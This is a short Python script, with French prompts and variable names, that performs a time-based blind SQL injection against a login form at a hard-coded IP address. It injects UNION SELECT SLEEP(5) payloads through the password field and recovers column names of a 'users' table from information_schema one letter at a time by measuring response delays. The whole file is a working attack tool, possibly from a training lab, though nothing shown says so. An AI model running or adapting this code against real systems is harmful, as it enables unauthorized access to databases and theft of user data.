import requests
import time

def column_name(database, nom_table):
    dictionary = ["a","b","c","d","e","f","g","h","i","j","k","l","m","n","o","p","q","r","s","t","u","v","w","x","y","z"]
    columns_name=[]
    a=0
    texte = ""
    TIME = 5
    table = ",1,2"
    url = "http://51.15.136.118/pageid.php"
    for i in range(1, 50):
        for j in range(0, len(dictionary)):
            if a > 27:
                if texte != "":
                    print(texte)
                    rm_letter = texte[0]
                    dictionary.remove(rm_letter)
                    print(dictionary)
                    columns_name.append(texte)
                    texte = ""
                    a=0
                    print(texte)
                    break
                else:
                    break
            usr = "idc"
            passwd = "' UNION SELECT SLEEP(5)" + table + " COLUMN_NAME FROM information_schema.columns WHERE table_schema='" + database + "' AND TABLE_NAME='" + nom_table + "' AND COLUMN_NAME like '" + texte + dictionary[j] + "%' -- "
            print(passwd)
            start_time = time.time()
            response = requests.post(url, data={'username': usr, 'password': passwd})
            end_time = time.time()
            total_time = end_time - start_time
            a += 1
            print(texte)
            print(columns_name)
            print(a)
            
            if total_time >= TIME:
                texte += dictionary[j]
                print(texte)
                i += 1
                j = 0
                a = 0
                break
    print(columns_name)
    b=0
    for x in columns_name:
        b += 1
        print("Table {} : {} ".format(b, x))
    c = int(input("Choisissez le numéro correspondant au nom de la colonne sur laquelle vous voulez continué : "))
    print("Vous avez choisi {}. ".format(columns_name[c-1]))
    final_db=""
    jsp3 = final_db + "".join(columns_name[c-1])
    print(jsp3)
    return jsp3

nom_base_de_donnée = "nom_user_db"
nom_table = "users"
nom_colonne = column_name(nom_base_de_donnée, nom_table)
